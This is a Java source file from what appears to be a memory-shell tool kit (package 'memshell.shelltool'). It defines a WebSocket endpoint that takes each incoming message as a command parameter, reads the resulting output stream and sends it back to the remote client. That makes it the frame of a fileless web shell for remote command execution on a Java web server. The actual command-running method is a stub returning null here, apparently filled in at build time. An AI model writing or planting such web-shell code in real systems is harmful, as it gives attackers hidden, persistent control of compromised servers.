package com.reajason.javaweb.memshell.shelltool.command;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/**
 * <a href="https://github.com/veo/wsMemShell">wsMemShell</a>
 *
 * @author ReaJason
 * @since 2024/12/9
 */
public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<String> {

    private Session session;

    @Override
    public void onMessage(String cmd) {
        try {
            InputStream inputStream = getInputStream(getParam(cmd));
            byte[] buf = new byte[8192];
            int length;
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            while ((length = inputStream.read(buf)) != -1) {
                outputStream.write(buf, 0, length);
            }
            session.getBasicRemote().sendText(outputStream.toString());
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
